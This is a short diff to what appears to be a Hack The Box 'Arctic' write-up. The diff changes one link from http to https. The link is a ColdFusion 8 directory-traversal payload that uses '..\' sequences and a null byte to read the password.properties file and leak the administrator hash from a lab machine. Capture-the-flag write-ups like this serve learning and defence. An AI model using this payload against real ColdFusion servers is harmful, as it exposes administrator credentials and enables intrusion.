@@ -66,7 +66,7 @@ A quick google search gave a site which explained about all things about ColdFus
 
 Here is the URL to spill the Hash.
 
-[http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en](http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en)
+[https://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en](https://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en)
 
 ![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-2.png)
 
